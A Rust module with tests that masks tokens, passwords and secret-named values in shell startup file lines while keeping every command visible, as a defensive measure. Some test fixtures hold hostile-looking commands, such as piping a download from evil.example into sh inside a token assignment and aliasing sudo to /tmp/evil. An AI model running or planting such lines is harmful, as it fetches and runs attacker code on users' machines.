//! Masking the secrets in a startup file's lines, so its tokens never reach the bundle while
//! every command in it does.
//!
//! Each physical line is copied as it is, with two kinds of word replaced by `(hidden)`:
//!
//! - a word shaped like a secret ([`secret_shaped`]): a known token format (`ghp_`, `sk-`,
//!   `AKIA`, a JWT, ...), a long high-entropy string, or 32 hex digits or more. Inside a URL or
//!   a pin (`sha256:...`), a part of 40 or 64 hex digits is a git commit or a digest and is
//!   shown ([`secret_part`]);
//! - the value of an assignment, option or header whose name says it is secret
//!   ([`secret_name`]): `GITHUB_TOKEN=x`, `export DB_PASSWORD="x y"`, `--api-key=x`,
//!   `--token x`, `launchctl setenv API_KEY x`, a crontab's `API_TOKEN = x`, and
//!   `"Authorization: Bearer x"`. A value that runs a command (`$(...)`, backquotes) or is a
//!   path is not masked by its name, so what runs stays visible; the word rules still mask a
//!   token inside it;
//! - the password in a URL (`postgres://app:x@db`).
//!
//! No shell is parsed, and nothing carries from one line to the next (owner's decision,
//! 2026-11-18). The first design hid the value of every assignment, which needs a shell lexer;
//! five reviews in a row found lines where it read the shell differently from zsh or bash, and
//! each difference either leaked a token into the bundle or let a planted line (`# TOKEN="`)
//! hide a later command from the agent. Masking words cannot hide a line, so the second can no
//! longer happen. Accepted downside: a short password under an innocent name (`DB=hunter2`)
//! or passed as a bare argument (`mysql -phunter2`, `sshpass -p hunter2`) is shown, and so is
//! a key split over lines whose lines are short, and a capability URL whose secret is a UUID
//! (`hc-ping.com/<uuid>`): UUIDs name too many harmless things to mask by shape.

/// What replaces a masked word.
const HIDDEN: &str = "(hidden)";

/// The prefixes of token formats that providers publish, each followed by enough characters to
/// be a token, not a mention: GitHub, GitLab, Slack, OpenAI and Anthropic, Stripe, AWS access
/// key ids, Google API keys and OAuth access tokens, npm, PyPI, Hugging Face, Digital Ocean,
/// Send Grid, Shopify. The rest must hold a digit or an upper-case letter, as generated tokens
/// do, so a variable name such as `npm_config_script_shell` is not one.
const TOKEN_PREFIXES: [&str; 28] = [
    "ghp_",
    "gho_",
    "ghu_",
    "ghs_",
    "ghr_",
    "github_pat_",
    "glpat-",
    "xoxb-",
    "xoxp-",
    "xoxa-",
    "xoxs-",
    "xapp-",
    "sk-",
    "sk_live_",
    "rk_live_",
    "AKIA",
    "ASIA",
    "AIza",
    "npm_",
    "pypi-",
    "hf_",
    "ya29.",
    "xoxe.",
    "xoxe-",
    "dop_v1_",
    "SG.",
    "shpat_",
    "shpss_",
];

/// The segments of a name (split at `_` and `-`) that say its value is secret, matched in
/// upper case. A whole segment, so `SUDO_ASKPASS` (a program sudo runs) and `GIT_AUTHOR_NAME`
/// are shown; a segment may also end in one of [`SECRET_ENDINGS`] (`_authToken`, `APIKEY`).
const SECRET_WORDS: [&str; 12] = [
    "TOKEN",
    "SECRET",
    "PASSWORD",
    "PASSWD",
    "PASSPHRASE",
    "PASS",
    "PWD",
    "AUTH",
    "AUTHORIZATION",
    "CREDENTIAL",
    "CREDENTIALS",
    "KEY",
];

/// Endings of a name segment that say its value is secret (`AUTHTOKEN`, `CLIENTSECRET`,
/// `secretKey`).
const SECRET_ENDINGS: [&str; 8] = [
    "TOKEN",
    "SECRET",
    "PASSWORD",
    "PASSPHRASE",
    "APIKEY",
    "SECRETKEY",
    "PRIVATEKEY",
    "ACCESSKEY",
];

/// The shortest word the entropy rule masks. Arbitrary but conventional: generated tokens are
/// 20 characters and more, and a shorter rule masks ordinary words and paths.
const MIN_RANDOM_LEN: usize = 20;

/// The bytes between words. A word may hold `/`, `:`, `@`, `.`, `+`, `-` and `%`, so a URL, an
/// AWS secret or a JWT is one word.
const BREAK: &[u8] = b" \t'\"`=;&|<>(){}[],$#\\";

/// The lines of `text`, secrets masked, one for each physical line.
pub(super) fn lines(text: &str) -> Vec<String> {
    text.lines().map(mask).collect()
}

/// `line` with its secret-shaped words and the values of its secret-named assignments and
/// options replaced by `(hidden)`.
fn mask(line: &str) -> String {
    let bytes = line.as_bytes();
    let mut out = String::with_capacity(line.len());
    let mut at = 0;
    while at < bytes.len() {
        if let Some(span) = secret_value_at(line, at) {
            out.push_str(&line[at..span.value]);
            if span.value < span.end {
                out.push_str(HIDDEN);
            }
            at = span.end;
            continue;
        }
        if BREAK.contains(&bytes[at]) {
            out.push(char::from(bytes[at]));
            at += 1;
            continue;
        }
        let mut word_end = bytes[at..]
            .iter()
            .position(|b| BREAK.contains(b))
            .map_or(bytes.len(), |len| at + len);
        // A secret name inside the word, after `?`, `:` or `/` (`...?token=x`), ends it there,
        // so the next turn masks its value.
        if let Some(inner) = (at + 1..word_end)
            .find(|&p| b"?:/".contains(&bytes[p - 1]) && secret_value_at(line, p).is_some())
        {
            word_end = inner;
        }
        let word = &line[at..word_end];
        if secret_shaped(word) {
            out.push_str(HIDDEN);
        } else if word.len() > "pass:".len() && word.starts_with("pass:") {
            // openssl's `-passin pass:x`, a password in the word itself.
            out.push_str("pass:");
            out.push_str(HIDDEN);
        } else {
            out.push_str(&mask_parts(word));
        }
        at = word_end;
    }
    out
}

/// `word` with each part between `/`, `:` and `@` that looks like a secret masked
/// ([`secret_part`]), so a token in a URL (`https://u:ghp_x@github.com`) or a path is hidden
/// and the URL or path keeps its shape for the agent.
fn mask_parts(word: &str) -> String {
    if let Some((before, after)) = url_password(word) {
        return format!("{}{HIDDEN}{}", mask_parts(before), mask_parts(after));
    }
    let mut out = String::with_capacity(word.len());
    let mut start = 0;
    for (at, c) in word
        .char_indices()
        .filter(|(_, c)| matches!(c, '/' | ':' | '@'))
    {
        let part = &word[start..at];
        out.push_str(if secret_part(part) { HIDDEN } else { part });
        out.push(c);
        start = at + c.len_utf8();
    }
    let last = &word[start..];
    out.push_str(if secret_part(last) { HIDDEN } else { last });
    out
}

/// A URL's text before and after the secret in its user part, when it has one: the password
/// in `scheme://user:password@`, or a token as the user (`https://<token>@github.com`). A port
/// before a path holding `@` (`localhost:3000/@vite`) is not a password.
fn url_password(word: &str) -> Option<(&str, &str)> {
    let start = word.find("://")? + 3;
    let at = start + word[start..].find('@')?;
    if let Some(colon) = word[start..at].find(':') {
        let colon = start + colon;
        let secret = &word[colon + 1..at];
        // `host:3000/@path`: digits up to a `/` are a port, and the `@` is the path's.
        let port = secret.split_once('/').is_some_and(|(digits, _)| {
            !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit())
        });
        (!secret.is_empty() && !port).then(|| (&word[..=colon], &word[at..]))
    } else {
        let user = &word[start..at];
        let token = !user.contains('/') && (secret_shaped(user) || (user.len() >= 32 && hex(user)));
        token.then(|| (&word[..start], &word[at..]))
    }
}

/// Whether `text` is all hex digits.
fn hex(text: &str) -> bool {
    text.bytes().all(|b| b.is_ascii_hexdigit())
}

/// Where a secret value starts and ends.
#[derive(Debug)]
struct Span {
    value: usize,
    end: usize,
}

/// The value of a secret-named assignment, option or header that starts at byte `at`, which
/// must start a word: `NAME=value` or `NAME+=value` (after `export` and the like, or anywhere
/// on the line), `NAME = value` at the start of a line (a crontab's), `--name=value`,
/// `--name value`, `launchctl setenv NAME value`, `"Name: value"` (a header, inside quotes
/// only), or `"name":"value"` (JSON). The value runs to its closing quote when it starts with
/// one (or to the end of the line when none closes it), a header's to its own quote, and
/// otherwise to the next white space, quote, `;`, `&` or `|`. A value that runs a command, is
/// a path, or refers to another variable gives `None` (see the module docs).
fn secret_value_at(line: &str, at: usize) -> Option<Span> {
    let bytes = line.as_bytes();
    // A name also starts after `?`, `:` or `/`: a query (`?token=x`) or npm's
    // `//registry/:_authToken=x`.
    if at > 0 && !BREAK.contains(&bytes[at - 1]) && !b"?:/".contains(&bytes[at - 1]) {
        return None;
    }
    let dashes = line[at..].len() - line[at..].trim_start_matches('-').len();
    let name_at = at + dashes;
    let name_len = line[name_at..]
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-'))
        .unwrap_or(line.len() - name_at);
    let name = &line[name_at..name_at + name_len];
    if !secret_name(name) {
        return None;
    }
    let after = &line[name_at + name_len..];
    let line_start = line[..at].trim().is_empty();
    let spaced = after.trim_start_matches([' ', '\t']);
    // A name inside quotes: a header (`"Authorization: Bearer x"`), whose value runs to that
    // quote, or a JSON key (`{"password":"x"}`), whose value follows the closing quote.
    let quote = at
        .checked_sub(1)
        .map(|b| bytes[b])
        .filter(|b| matches!(b, b'"' | b'\''));
    let json = quote.and_then(|q| after.strip_prefix(char::from(q))?.strip_prefix(':'));
    let (separator, header) = if let Some(rest) = after.strip_prefix("+=") {
        (line.len() - rest.len(), None)
    } else if let Some(rest) = after.strip_prefix('=') {
        (line.len() - rest.len(), None)
    } else if let Some(rest) = spaced.strip_prefix('=').filter(|_| line_start) {
        let rest = rest.trim_start_matches([' ', '\t']);
        (line.len() - rest.len(), None)
    } else if let (Some(q), Some(rest)) = (quote, after.strip_prefix(':')) {
        let rest = rest.trim_start_matches([' ', '\t']);
        (line.len() - rest.len(), Some(q))
    } else if let Some(rest) = json {
        let rest = rest.trim_start_matches([' ', '\t']);
        (line.len() - rest.len(), None)
    } else if dashes > 0 || line[..at].trim_end().ends_with("setenv") {
        // `--token x` and `launchctl setenv TOKEN x`: the next word is the value, unless it is
        // another option or an operator (`--password-stdin -u me`).
        let none = spaced.len() == after.len() || spaced.is_empty();
        if none || spaced.starts_with(['-', '<', '>', '|']) {
            return None;
        }
        (line.len() - spaced.len(), None)
    } else {
        return None;
    };
    let value = &line[separator..];
    let len = match header {
        // Never past the header's own quote, so the rest of the line stays as written.
        Some(q) => value.find(char::from(q)).unwrap_or(value.len()),
        // `$'...'`, ANSI-C quoting: a quoted literal.
        None if value.starts_with("$'") => value[2..].find('\'').map_or(value.len(), |at| at + 3),
        None => match value.chars().next() {
            Some(quote @ ('"' | '\'')) => value[1..].find(quote).map_or(value.len(), |at| at + 2),
            _ => value
                .find([' ', '\t', ';', '&', '|', '"', '\''])
                .unwrap_or(value.len()),
        },
    };
    let shown = &value[..len];
    let unquoted = shown.trim_start_matches(['"', '\'']);
    let runs = shown.contains("$(") || shown.contains('`');
    // A path, or a reference to another variable (`$TMPDIR/agent.sock`), holds no secret of
    // its own and may say what runs. `$'...'` is ANSI-C quoting, a literal.
    let path = unquoted.starts_with(['/', '~', '.']);
    let reference = unquoted.starts_with('$') && !unquoted.starts_with("$'");
    if runs || path || reference {
        return None;
    }
    Some(Span {
        value: separator,
        end: separator + len,
    })
}

/// Whether a name says its value is secret: one of its segments, split at `_` and `-` and
/// upper-cased, is one of [`SECRET_WORDS`] or ends in one of [`SECRET_ENDINGS`].
fn secret_name(name: &str) -> bool {
    name.split(['_', '-']).any(|segment| {
        let segment = segment.to_ascii_uppercase();
        SECRET_WORDS.contains(&segment.as_str())
            || SECRET_ENDINGS
                .iter()
                .any(|ending| segment.ends_with(ending))
    })
}

/// Whether `word` as a whole looks like a secret: it starts with a published token prefix and
/// goes on for at least 16 more characters, is a Mailgun key, a JWT, 32 hex digits or more
/// (with or without `0x`: `openssl rand -hex 32` makes secrets so), an AWS secret access key
/// (40 characters of base64 with all three kinds), or a long random base64 body.
fn secret_shaped(word: &str) -> bool {
    let has_prefix = TOKEN_PREFIXES.iter().any(|prefix| {
        word.strip_prefix(prefix).is_some_and(|rest| {
            rest.len() >= 16
                && rest
                    .bytes()
                    .any(|b| b.is_ascii_digit() || b.is_ascii_uppercase())
        })
    });
    // Mailgun's keys: `key-` and 32 hex digits.
    let mailgun = word
        .strip_prefix("key-")
        .is_some_and(|rest| rest.len() == 32 && rest.bytes().all(|b| b.is_ascii_hexdigit()));
    let jwt = word.starts_with("eyJ") && word.split('.').count() == 3 && word.len() >= 30;
    let digits = word.strip_prefix("0x").unwrap_or(word);
    let long_hex = digits.len() >= 32 && hex(digits);
    let aws_secret = word.len() == 40
        && word
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'/' || b == b'+')
        && all_kinds(word);
    // A key's base64 body (a PEM line, a session token): long, all three kinds, random. Not a
    // path, which starts with `/` or `~` and holds words, not noise.
    let base64 = word.len() >= 40
        && !word.starts_with(['/', '~'])
        && word
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'+' | b'='))
        && all_kinds(word)
        && entropy(word) >= 4.0;
    has_prefix || mailgun || jwt || long_hex || aws_secret || base64
}

/// Whether a part of a word looks like a secret: as a whole word would ([`secret_shaped`]), or
/// random ([`random`]).
fn secret_part(part: &str) -> bool {
    // A git commit (40 hex digits) or a SHA-256 digest (64) as part of a URL or a pin
    // (`sha256:...`, `at:...`) says what a line runs, which the agent needs: shown. Hex of
    // another length is masked, and a whole word of hex is masked at any length, since a
    // pin as its own word cannot be told from a key.
    let pin = matches!(part.len(), 40 | 64) && hex(part);
    !pin && (secret_shaped(part) || random(part))
}

/// Whether a part of a word reads as random: [`MIN_RANDOM_LEN`] characters or more, lower and
/// upper case and digits, no `.` (a file name or host name has one), and at least 3.5 bits of
/// entropy per character. The threshold is arbitrary, below base62 and base64 tokens (over 4
/// bits) and above a word repeated or a version string.
fn random(part: &str) -> bool {
    part.len() >= MIN_RANDOM_LEN && !part.contains('.') && all_kinds(part) && entropy(part) >= 3.5
}

/// Whether `word` holds a lower-case letter, an upper-case letter and a digit.
fn all_kinds(word: &str) -> bool {
    word.bytes().any(|b| b.is_ascii_lowercase())
        && word.bytes().any(|b| b.is_ascii_uppercase())
        && word.bytes().any(|b| b.is_ascii_digit())
}

/// The Shannon entropy of `word`'s bytes, in bits per byte.
fn entropy(word: &str) -> f64 {
    let mut counts = [0_u32; 256];
    for byte in word.bytes() {
        counts[usize::from(byte)] += 1;
    }
    #[expect(
        clippy::cast_precision_loss,
        reason = "a word is at most a line, far below 2^52 bytes"
    )]
    let len = word.len() as f64;
    counts
        .iter()
        .filter(|&&count| count > 0)
        .map(|&count| {
            let p = f64::from(count) / len;
            -p * p.log2()
        })
        .sum()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn secret_shaped_words_are_masked_wherever_they_are() {
        let cases = [
            (
                "export GITHUB=ghp_0123456789abcdefABCDEF0123",
                "export GITHUB=(hidden)",
            ),
            (
                "gh auth login --with-token ghp_0123456789abcdefABCD",
                "gh auth login --with-token (hidden)",
            ),
            (
                "curl -H 'Authorization: Bearer sk-proj-abcdefghij0123456789'",
                "curl -H 'Authorization: (hidden)'",
            ),
            (
                "aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE1",
                "aws configure set aws_access_key_id (hidden)",
            ),
            (
                "echo wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY > ~/.aws/x",
                "echo (hidden) > ~/.aws/x",
            ),
            (
                "X=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcDEF123ghiJKL456",
                "X=(hidden)",
            ),
            (
                "# old: xoxb-1234567890-0987654321-abcdefABCDEF",
                "# old: (hidden)",
            ),
            ("K=0123456789abcdef0123456789abcdef", "K=(hidden)"),
            (
                "//registry.npmjs.org/:_authToken=npm_abcdefghijklmnopqrstuvwxyz0123",
                "//registry.npmjs.org/:_authToken=(hidden)",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
    }

    #[test]
    fn values_of_secret_names_are_masked() {
        let cases = [
            ("export DB_PASSWORD=hunter2", "export DB_PASSWORD=(hidden)"),
            (
                "export AUTH=\"Bearer abc def\" && echo ok",
                "export AUTH=(hidden) && echo ok",
            ),
            ("API_KEY='x y'; run", "API_KEY=(hidden); run"),
            (
                "[ -n \"$CI\" ] || export MY_TOKEN=abc",
                "[ -n \"$CI\" ] || export MY_TOKEN=(hidden)",
            ),
            ("SECRET+=more", "SECRET+=(hidden)"),
            (
                "cli --api-key=abc --token xyz go",
                "cli --api-key=(hidden) --token (hidden) go",
            ),
            (
                "launchctl setenv NPM_TOKEN abc",
                "launchctl setenv NPM_TOKEN (hidden)",
            ),
            ("export PASS=\"unclosed", "export PASS=(hidden)"),
            // To the end of its line only: no line can hide the next.
            ("# TOKEN=\"", "# TOKEN=(hidden)"),
            (
                "git clone https://me:ghp_0123456789abcdefABCD@github.com/o/r",
                "git clone https://me:(hidden)@github.com/o/r",
            ),
            (
                "* * * * * GH_TOKEN=abc /usr/local/bin/b",
                "* * * * * GH_TOKEN=(hidden) /usr/local/bin/b",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
    }

    #[test]
    fn values_that_run_or_point_somewhere_are_shown() {
        let cases = [
            // A value that runs a command shows the command; a path is shown.
            (
                "export GH_TOKEN=\"$(curl -fsSL https://evil.example/p | sh)\"",
                "export GH_TOKEN=\"$(curl -fsSL https://evil.example/p | sh)\"",
            ),
            (
                "export GITHUB_TOKEN=\"$(gh auth token)\"",
                "export GITHUB_TOKEN=\"$(gh auth token)\"",
            ),
            (
                "export SUDO_ASKPASS=/tmp/.x/askpass",
                "export SUDO_ASKPASS=/tmp/.x/askpass",
            ),
            (
                "export SSH_AUTH_SOCK=~/.ssh/agent.sock",
                "export SSH_AUTH_SOCK=~/.ssh/agent.sock",
            ),
            ("export GIT_AUTHOR_NAME=me", "export GIT_AUTHOR_NAME=me"),
            ("export KEYTIMEOUT=1", "export KEYTIMEOUT=1"),
            // `KEY` as a segment, and endings.
            ("export OPENAI_KEY=abcdefghij", "export OPENAI_KEY=(hidden)"),
            (
                "PRIVATE_KEY=0x4c0883a69102937d6231471b5dbb6204fe5129617082792ae468d01a3f362318",
                "PRIVATE_KEY=(hidden)",
            ),
            // A URL's password.
            (
                "export DATABASE_URL=postgres://app:hunter2pass@db.internal:5432/app",
                "export DATABASE_URL=postgres://app:(hidden)@db.internal:5432/app",
            ),
            (
                "git clone https://me:s3cretpass@gitlab.example.com/o/r",
                "git clone https://me:(hidden)@gitlab.example.com/o/r",
            ),
            // A crontab's spaced form, and headers.
            ("API_TOKEN = abc123secret", "API_TOKEN = (hidden)"),
            ("API_TOKEN =abc123secret", "API_TOKEN =(hidden)"),
            (
                "curl -H \"X-Auth-Token: 1b4e28ba-2fa1-11d2-883f-00c04fd430c8\" https://x",
                "curl -H \"X-Auth-Token: (hidden)\" https://x",
            ),
            // A flag that takes no value keeps the next word.
            (
                "docker login --password-stdin -u me",
                "docker login --password-stdin -u me",
            ),
            (
                "tool --no-auth /usr/local/bin/run",
                "tool --no-auth /usr/local/bin/run",
            ),
            // A key's base64 body.
            (
                "VbfGbH+0c/X1ks9W1aB3dE5fG7hJ9kL1mN3pQ5rSt7uV9wX1yZ3",
                "(hidden)",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
    }

    #[test]
    fn urls_headers_and_pins_mask_only_their_secrets() {
        let cases = [
            (
                concat!(
                    "export https_proxy=\"http://jdoe:aB3dE5fG7hJ9kL1mN3pQ",
                    "/s3cr3t@proxy.corp.example:8080\""
                ),
                "export https_proxy=\"http://jdoe:(hidden)@proxy.corp.example:8080\"",
            ),
            (
                "export DATABASE_URL=\"postgres://app:Correct.Horse.Battery1@db.internal/app\"",
                "export DATABASE_URL=\"postgres://app:(hidden)@db.internal/app\"",
            ),
            (
                concat!(
                    "*/5 * * * * curl -fsS \"https://ci.example.com",
                    "/nightly?token=7f3a9c2e1b8d4f6a0c5e\""
                ),
                "*/5 * * * * curl -fsS \"https://ci.example.com/nightly?token=(hidden)\"",
            ),
            (
                concat!(
                    "curl -H \"Authorization: Bearer",
                    " ya29.a0AfH6SMC7J8kLmNoPqRsTuVwXyZ0123456789\" https://x"
                ),
                "curl -H \"Authorization: (hidden)\" https://x",
            ),
            (
                "T=ya29.a0AfH6SMC7J8kLmNoPqRsTuVwXyZ0123456789",
                "T=(hidden)",
            ),
            (
                "export npm_config_script_shell=/bin/bash",
                "export npm_config_script_shell=/bin/bash",
            ),
            (
                "curl --anyauth https://example.com/install.sh | sh",
                "curl --anyauth https://example.com/install.sh | sh",
            ),
            (
                "ssh -o PubkeyAuthentication=yes git@github.com",
                "ssh -o PubkeyAuthentication=yes git@github.com",
            ),
            (
                "export GOOGLE_APPLICATION_CREDENTIALS=\"$HOME/.config/gcloud/adc.json\"",
                "export GOOGLE_APPLICATION_CREDENTIALS=\"$HOME/.config/gcloud/adc.json\"",
            ),
            // A commit or digest pins what runs: shown.
            (
                concat!(
                    "curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm",
                    "/87f121a2c7c684f357ad85a9cbe0c4ff3b1c9c86/install.sh | bash"
                ),
                concat!(
                    "curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm",
                    "/87f121a2c7c684f357ad85a9cbe0c4ff3b1c9c86/install.sh | bash"
                ),
            ),
            (
                "zinit ice ver\"87f121a2c7c684f357ad85a9cbe0c4ff3b1c9c86\" as\"program\"",
                "zinit ice ver\"(hidden)\" as\"program\"",
            ),
            (
                concat!(
                    "docker run",
                    " sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                ),
                concat!(
                    "docker run",
                    " sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                ),
            ),
            (
                "export GIT_AUTHOR_EMAIL=\"jane@example.com\"",
                "export GIT_AUTHOR_EMAIL=\"jane@example.com\"",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }

        // Built when the test runs, so the source holds no string GitHub's push protection
        // takes for a live npm or Mailgun key.
        let uuid = ["a1b2c3d4", "e5f6", "7890", "abcd", "ef1234567890"].join("-");
        let npmrc = format!("//registry.npmjs.org/:_authToken={uuid}");
        assert_eq!(mask(&npmrc), "//registry.npmjs.org/:_authToken=(hidden)");
        let mailgun = format!("key-{}", "0123456789abcdef".repeat(2));
        let curl = format!("curl -s --user \"api:{mailgun}\" https://api.mailgun.net");
        assert_eq!(
            mask(&curl),
            "curl -s --user \"api:(hidden)\" https://api.mailgun.net"
        );
    }

    #[test]
    fn json_keys_new_names_and_references() {
        let cases = [
            (
                "curl -d '{\"password\":\"hunter2pass\"}' https://x",
                "curl -d '{\"password\":(hidden)}' https://x",
            ),
            (
                "curl -d '{\"api_key\": \"abc123def456\"}' https://x",
                "curl -d '{\"api_key\": (hidden)}' https://x",
            ),
            ("BORG_PASSPHRASE=correct-horse", "BORG_PASSPHRASE=(hidden)"),
            ("MYSQL_PWD=hunter2", "MYSQL_PWD=(hidden)"),
            ("secretKey=abc", "secretKey=(hidden)"),
            (
                "export SSH_AUTH_SOCK=$TMPDIR/agent.sock",
                "export SSH_AUTH_SOCK=$TMPDIR/agent.sock",
            ),
            (
                "export SSH_AUTH_SOCK=${XDG_RUNTIME_DIR}/ssh.sock",
                "export SSH_AUTH_SOCK=${XDG_RUNTIME_DIR}/ssh.sock",
            ),
            (
                "tool --token-file ./token.txt",
                "tool --token-file ./token.txt",
            ),
            ("TOKEN=$OTHER_TOKEN", "TOKEN=$OTHER_TOKEN"),
            ("TOKEN=$'abc'", "TOKEN=(hidden)"),
            (
                "openssl rsa -passin pass:hunter2 -in k.pem",
                "openssl rsa -passin pass:(hidden) -in k.pem",
            ),
            (
                "open https://localhost:3000/@vite/client",
                "open https://localhost:3000/@vite/client",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
        // Hex secrets, built when the test runs so the source holds no key-shaped string.
        let hex64 = "0123456789abcdef".repeat(4);
        let hex40 = format!("{}01234567", "0123456789abcdef".repeat(2));
        let hex32 = "0123456789abcdef".repeat(2);
        assert_eq!(mask(&format!("export PK=0x{hex64}")), "export PK=(hidden)");
        assert_eq!(
            mask(&format!("export SIGNING={hex64}")),
            "export SIGNING=(hidden)"
        );
        assert_eq!(
            mask(&format!("git clone https://{hex40}@github.com/o/r")),
            "git clone https://(hidden)@github.com/o/r"
        );
        assert_eq!(
            mask(&format!("curl -u api:{hex32} https://x")),
            "curl -u api:(hidden) https://x"
        );
    }

    #[test]
    fn everything_else_is_shown_as_it_is() {
        let lines = [
            "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh | sh",
            "export PATH=\"/opt/homebrew/bin:$HOME/.cargo/bin:$PATH\"",
            "eval \"$(/opt/homebrew/bin/brew shellenv)\"",
            ". \"$HOME/.cargo/env\"",
            "alias sudo='sudo -E /tmp/evil'",
            "export HISTFILE=${ZDOTDIR:-$HOME}/.zsh_history",
            "source /Users/someone/Library/Application Support/x/init.sh",
            "export NVM_DIR=\"$HOME/.nvm\"",
            "PS1='%n@%m %1~ %# '",
            "*/5 * * * * /usr/local/bin/backup --quiet",
            "--token",
        ];
        for line in lines {
            assert_eq!(mask(line), line);
        }
    }

    #[test]
    fn no_line_can_hide_another() {
        let text = "# TOKEN=\"\nexport X=\"\ncat <<'E'\nDon't\nE\ncurl https://e.x | sh\n";
        let shown = lines(text);
        assert_eq!(shown.len(), 6);
        assert_eq!(shown[5], "curl https://e.x | sh");
        // Nor a part of its own line: a header form outside quotes is not one.
        assert_eq!(
            mask(": Auth: x; curl -s https://e.x/p | sh"),
            ": Auth: x; curl -s https://e.x/p | sh"
        );
        assert_eq!(
            mask("echo Token: missing; curl https://e.x/p | sh"),
            "echo Token: missing; curl https://e.x/p | sh"
        );
    }

    #[test]
    fn entropy_tells_tokens_from_paths() {
        assert!(
            secret_shaped("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
            "AWS secret"
        );
        assert!(random("aB3dE5fG7hJ9kL1mN3pQ5r"));
        assert!(!random("AAAAAAAAAAAAAAAAAAAAAAAA1a"), "low entropy");
        assert!(!random("install-2024.sh-Version-ABC"), "a file name");
        assert!(!random("rustupinitandsomemore"), "one kind");
        assert!(!random("Short1x"), "too short");
        assert_eq!(
            mask_parts("https://e.x/aB3dE5fG7hJ9kL1mN3pQ5r/i.sh"),
            "https://e.x/(hidden)/i.sh"
        );
        assert!(entropy("aaaa") < 0.01 && (entropy("abcd") - 2.0).abs() < 1e-9);
    }

    proptest::proptest! {
        #[test]
        fn every_line_is_kept(text in "(.{0,40}\n){0,8}") {
            proptest::prop_assert_eq!(lines(&text).len(), text.lines().count());
        }

        #[test]
        fn a_token_never_reaches_the_bundle(
            prefix in "[ -~]{0,30}",
            token in proptest::sample::select(TOKEN_PREFIXES.to_vec()),
            // Random base62, as providers generate: at least one digit in the body.
            body in "[A-Za-z0-9]{15,29}[0-9]",
            suffix in "[ -~]{0,30}",
            space in proptest::sample::select(vec![" ", "=", "'", "\"", ":", "(", ";"]),
        ) {
            let secret = format!("{token}{body}");
            let line = format!("{prefix}{space}{secret} {suffix}");
            let shown = mask(&line);
            proptest::prop_assert!(!shown.contains(&secret), "{line} -> {shown}");
        }

        #[test]
        fn a_secret_name_s_value_never_reaches_the_bundle(
            prefix in proptest::sample::select(vec![
                "", "export ", "x; ", "a && ", "# ", "alias a='", "env ", "0 * * * * ",
                "echo \"",
            ]),
            name in proptest::sample::select(vec![
                "GITHUB_TOKEN", "DB_PASSWORD", "API_KEY", "AUTH", "client_secret", "NPM_TOKEN",
            ]),
            value in "[a-z0-9]{8,16}",
            quote in proptest::sample::select(vec!["", "'", "\""]),
        ) {
            let line = format!("{prefix}{name}={quote}{value}{quote} rest");
            let shown = mask(&line);
            proptest::prop_assert!(!shown.contains(&value), "{line} -> {shown}");
        }
    }
}
